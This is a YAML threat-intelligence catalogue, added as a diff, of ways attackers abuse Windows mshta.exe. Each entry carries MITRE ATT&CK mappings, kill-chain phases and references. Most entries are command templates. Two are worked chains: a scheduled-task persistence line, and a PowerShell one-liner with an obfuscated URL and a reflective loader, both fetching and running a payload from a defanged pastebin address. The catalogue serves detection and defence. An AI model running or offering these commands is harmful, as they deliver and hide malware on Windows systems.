@@ -1,0 +1,163 @@
+- command: 'mshta [filename.hta]'
+  description: 'Mshta is a Microsoft utility used to execute Microsoft HTML Application (HTA) files.  Threat Actors often abuse this feature to launch malicious code.'
+  executable:
+    - 'C:\Windows\System32\mshta.exe'
+    - 'C:\Windows\SysWOW64\mshta.exe'
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - 'https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)'
+    - 'https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)'
+  risk: High
+  fidelity: High
+  threatactors:
+    OilRig:
+      - 'https://unit42.paloaltonetworks.com/unit42-oilrig-deploys-alma-communicator-dns-tunneling-trojan/'
+- command: 'mshta vbscript:Execute("[Commands/Script]")'
+  description: 'Mshta is a Microsoft utility used to execute Microsoft HTML Application (HTA) files.  Threat Actors often abuse this feature to launch malicious code.'
+  executable:
+    - 'C:\Windows\System32\mshta.exe'
+    - 'C:\Windows\SysWOW64\mshta.exe'
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - 'https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)'
+    - 'https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)'
+  risk: High
+  fidelity: High
+  threatactors:
+    N/A:
+      - N/A
+- command: 'mshta.exe "[Inline HTA Script]"'
+  description: 'Mshta is a Microsoft utility used to execute Microsoft HTML Application (HTA) files.  Threat Actors often abuse this feature to launch malicious code.'
+  executable:
+    - 'C:\Windows\System32\mshta.exe'
+    - 'C:\Windows\SysWOW64\mshta.exe'
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - 'https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)'
+    - 'https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)'
+  risk: High
+  fidelity: High
+  threatactors:
+    N/A:
+      - N/A
+- command: 'mshta.exe [http://malware_url]'
+  description: 'Mshta is a Microsoft utility used to execute Microsoft HTML Application (HTA) files.  Threat Actors often abuse this feature to launch malicious code.'
+  executable:
+    - 'C:\Windows\System32\mshta.exe'
+    - 'C:\Windows\SysWOW64\mshta.exe'
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - 'https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)'
+    - 'https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)'
+  risk: High
+  fidelity: High
+  threatactors:
+    N/A:
+      - N/A
+- command: 'mshta javascript:[Commands/Script]'
+  description: 'Mshta is a Microsoft utility used to execute Microsoft HTML Application (HTA) files.  Threat Actors often abuse this feature to launch malicious code.'
+  executable:
+    - 'C:\Windows\System32\mshta.exe'
+    - 'C:\Windows\SysWOW64\mshta.exe'
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - 'https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)'
+    - 'https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)'
+  risk: High
+  fidelity: High
+  threatactors:
+    N/A:
+      - N/A
+- command: 'schtasks /create /sc MINUTE /mo 100 /tn eScan Backup /tr ""mshta vbscript:CreateObject(""Wscript.Shell"").Run(""mshta.exe hxxps://pastebin[.]com/raw/XXXXXXX"",0,true)(window.close)"" /F '
+  description: 'Example of scheduled task creation chained with abuse of mshta to download and execute a remote payload.'
+  executable:
+    - 'C:\Windows\System32\schtasks.exe'
+    - 'C:\Windows\System32\mshta.exe'
+    - 'C:\Windows\SysWOW64\mshta.exe'
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+    Execution:
+      - T1053.005
+    Persistence:
+      - T1053.005
+    Privilege Escalation:
+      - T1053.005
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - 'https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/'
+  risk: High
+  fidelity: High
+  threatactors:
+    N/A:
+      - N/A
+- command: mshta.exe vbscript:CreateObject(""Wscript.Shell"").Run(""powershell.exe -noexit -command [Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(\'h\'+\'x\'+\'x\'+\'p\'+\'s:\'+\'//p\'+\'a\'+\'s\'+\'t\'+\'e\'+\'b\'+\'i\'+\'n\'+\'.\'+\'c\'+\'o\'+\'m\'+\'/\'+\'r\'+\'a\'+\'w\'+\'/\'+\'XXXXXXXX\'))).EntryPoint.Invoke($N,$N)"",0,true)(window.close)
+  description: 'Example of mshta abuse combined with PowerShell to download and execute a remote payload.'
+  executable:
+    - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    - 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe'
+    - 'C:\Windows\System32\mshta.exe'
+    - 'C:\Windows\SysWOW64\mshta.exe'
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+    Execution:
+      - T1059.001
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - 'https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/'
+  risk: High
+  fidelity: High
+  threatactors:
+    N/A:
+      - N/A
